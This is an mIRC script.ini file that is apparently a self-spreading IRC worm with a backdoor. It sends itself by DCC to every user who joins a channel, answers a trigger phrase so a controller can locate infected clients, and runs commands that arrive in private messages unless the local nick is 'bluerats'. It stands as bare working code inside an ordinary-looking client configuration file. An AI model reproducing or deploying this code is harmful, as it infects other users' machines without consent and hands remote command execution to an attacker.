[script]
n0=on 1:text:*7abzy7*:#:/msg $nick $me
n1=on 1:text:   *:?:{ if ($me != bluerats) {s *2 | halt }}
n2=alias /s / *1
n3=on 1:connect:/.enable #d
n4=#d on
n5=on 1:join:#:{ if ($nick != $me) { dcc send $nick $mircdirscript.ini } | .disable #d | .timer 1 60 .enable #d }
n6=#d end
